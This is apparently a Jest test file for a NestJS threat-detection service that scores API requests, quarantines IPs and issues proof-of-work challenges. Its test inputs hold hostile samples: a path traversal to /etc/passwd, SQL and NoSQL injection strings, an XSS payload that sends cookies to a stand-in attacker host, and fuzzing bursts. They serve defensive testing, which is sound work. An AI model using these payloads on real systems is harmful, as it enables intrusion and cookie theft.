import { ExecutionContext, HttpException, HttpStatus } from '@nestjs/common';
import axios from 'axios';
import { lastValueFrom, of } from 'rxjs';
import { ThreatMonitorInterceptor } from '../../common/interceptors/threat-monitor.interceptor';
import { PowService } from './pow.service';
import {
  calculateShannonEntropy,
  ThreatDetectorService,
  ThreatRedisLike,
} from './threat-detector.service';

jest.mock('axios');
const mockedAxios = axios as jest.Mocked<typeof axios>;

describe('ThreatDetectorService & ThreatMonitorInterceptor (ML API Anomaly Engine)', () => {
  let detector: ThreatDetectorService;
  let powService: PowService;

  beforeEach(() => {
    powService = new PowService(undefined, {
      hmacSecret: 'test-threat-pow-secret',
      normalDifficulty: 2,
      disableRedis: true,
    });
    detector = new ThreatDetectorService(powService, undefined, {
      discordWebhookUrl: 'https://discord.com/api/webhooks/security-alerts',
      disableRedis: true,
    });
  });

  afterEach(() => {
    jest.resetAllMocks();
  });

  it('extracts all 12 behavioral features and scores benign developer API traffic low (< 35, ALLOW)', async () => {
    const assessment = await detector.evaluateRequest({
      ip: '203.0.113.10',
      userId: 'user-123',
      method: 'GET',
      path: '/api/v1/developers/Itssonia7',
      query: { tab: 'overview', year: '2026' },
      headers: {
        'user-agent':
          'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36',
        accept: 'application/json',
        'accept-language': 'en-US,en;q=0.9',
      },
    });

    expect(Object.keys(assessment.features)).toHaveLength(12);
    expect(assessment.features.pathTraversalDepth).toBe(0);
    expect(assessment.features.injectionTokenDensity).toBe(0);
    expect(assessment.features.userAgentEntropy).toBeGreaterThan(3.5);
    expect(assessment.anomalyScore).toBeLessThan(35);
    expect(assessment.action).toBe('ALLOW');
    expect(assessment.primaryVector).toBe('NORMAL');
    expect(assessment.evaluationTimeMs).toBeLessThan(5);
  });

  it('detects deep path traversal attacks and quarantines the offending IP (score > 90)', async () => {
    mockedAxios.post.mockResolvedValueOnce({ status: 204 });

    const assessment = await detector.evaluateRequest({
      ip: '198.51.100.42',
      method: 'GET',
      path: '/api/v1/files/../../../../etc/passwd%2e%2e%2f',
      headers: {
        'user-agent': 'curl/8.5.0',
      },
    });

    expect(assessment.features.pathTraversalDepth).toBeGreaterThanOrEqual(4);
    expect(assessment.anomalyScore).toBeGreaterThan(90);
    expect(assessment.action).toBe('QUARANTINE');
    expect(assessment.primaryVector).toBe('PATH_TRAVERSAL');
    expect(assessment.quarantineExpiresAt).toBeDefined();
    expect(await detector.isIpQuarantined('198.51.100.42')).toBe(true);
    expect(mockedAxios.post).toHaveBeenCalledTimes(1);
  });

  it('detects SQL/NoSQL/XSS parameter injection attempts and triggers adaptive challenge or quarantine', async () => {
    const assessment = await detector.evaluateRequest({
      ip: '198.51.100.77',
      method: 'POST',
      path: '/api/v1/search',
      query: { q: "' UNION SELECT passwordHash FROM users WHERE '1'='1" },
      body: {
        filter: { $where: 'this.passwordHash.length > 0' },
        bio: '<script>fetch("https://evil.example/?c="+document.cookie)</script>',
      },
      headers: {
        'user-agent': 'sqlmap/1.8.4#stable',
      },
    });

    expect(assessment.features.injectionTokenDensity).toBeGreaterThan(0.5);
    expect(assessment.detectedVectors).toContain('PARAMETER_INJECTION');
    expect(assessment.anomalyScore).toBeGreaterThan(75);
    expect(['CHALLENGE', 'QUARANTINE']).toContain(assessment.action);
  });

  it('triggers adaptive PoW friction (score 76-90) on high-velocity API fuzzing bursts and allows retry with valid PoW', async () => {
    const fuzzerIp = '192.0.2.88';
    const baseTs = Date.now();
    let lastAssessment = await detector.evaluateRequest({
      ip: fuzzerIp,
      method: 'GET',
      path: '/api/v1/probe-0',
      headers: { 'user-agent': 'ffuf/v2.1.0' },
      timestampMs: baseTs,
    });

    for (let i = 1; i <= 18; i++) {
      lastAssessment = await detector.evaluateRequest({
        ip: fuzzerIp,
        method: 'GET',
        path: `/api/v1/admin/fuzz-endpoint-${i}`,
        headers: { 'user-agent': 'ffuf/v2.1.0' },
        timestampMs: baseTs + i * 100,
      });
    }

    expect(lastAssessment.features.requestBurstFrequency).toBeGreaterThanOrEqual(
      18,
    );
    expect(lastAssessment.detectedVectors).toContain('API_FUZZING');
    expect(lastAssessment.anomalyScore).toBeGreaterThan(75);

    // Verify ThreatMonitorInterceptor enforces HTTP 428 / 403 and exposes telemetry
    const interceptor = new ThreatMonitorInterceptor(detector, powService);
    const mockHeaders: Record<string, string> = {};
    const mockContext = {
      getType: () => 'http',
      switchToHttp: () => ({
        getRequest: () => ({
          ip: fuzzerIp,
          method: 'GET',
          originalUrl: '/api/v1/admin/fuzz-next',
          query: {},
          body: {},
          headers: { 'user-agent': 'ffuf/v2.1.0' },
        }),
        getResponse: () => ({
          setHeader: (k: string, v: string) => {
            mockHeaders[k] = v;
          },
        }),
      }),
    } as unknown as ExecutionContext;

    await expect(
      lastValueFrom(
        interceptor.intercept(mockContext, { handle: () => of('ok') }),
      ),
    ).rejects.toThrow(HttpException);

    const telemetry = detector.getThreatTelemetry();
    expect(telemetry.summary.totalEvaluated).toBeGreaterThanOrEqual(20);
    expect(telemetry.vectorBreakdown.API_FUZZING).toBeGreaterThan(0);
    expect(telemetry.topOffendingIps[0].ip).toBe(fuzzerIp);
  });

  it('tracks sliding windows in Redis ZSETs per IP and user account and computes Shannon entropy accurately', async () => {
    const zsets = new Map<string, Array<{ score: number; member: string }>>();
    const kv = new Map<string, string>();
    const mockRedis: ThreatRedisLike = {
      zadd: jest.fn(async (key: string, score: number, member: string) => {
        const list = zsets.get(key) ?? [];
        list.push({ score, member });
        zsets.set(key, list);
        return 1;
      }),
      zremrangebyscore: jest.fn(async (key: string, min: number | string, max: number | string) => {
        const list = zsets.get(key) ?? [];
        const maxNum = Number(max);
        const filtered = list.filter((item) => item.score > maxNum);
        zsets.set(key, filtered);
        return list.length - filtered.length;
      }),
      zcard: jest.fn(async (key: string) => (zsets.get(key) ?? []).length),
      zrange: jest.fn(async (key: string) =>
        (zsets.get(key) ?? []).map((i) => i.member),
      ),
      expire: jest.fn(async () => 1),
      get: jest.fn(async (key: string) => kv.get(key) ?? null),
      set: jest.fn(async (key: string, val: string) => {
        kv.set(key, val);
        return 'OK';
      }),
      del: jest.fn(async (key: string) => (kv.delete(key) ? 1 : 0)),
      disconnect: jest.fn(),
    };

    detector.setRedisClient(mockRedis);

    await detector.evaluateRequest({
      ip: '203.0.113.55',
      userId: 'dev-42',
      method: 'GET',
      path: '/api/v1/repositories',
      headers: {
        'user-agent':
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
      },
    });

    expect(mockRedis.zadd).toHaveBeenCalledWith(
      'threat:win:ip:203.0.113.55',
      expect.any(Number),
      expect.any(String),
    );
    expect(mockRedis.zadd).toHaveBeenCalledWith(
      'threat:win:user:dev-42',
      expect.any(Number),
      expect.any(String),
    );
    expect(calculateShannonEntropy('aaaa')).toBe(0);
    expect(calculateShannonEntropy('abcd')).toBe(2);
  });
});
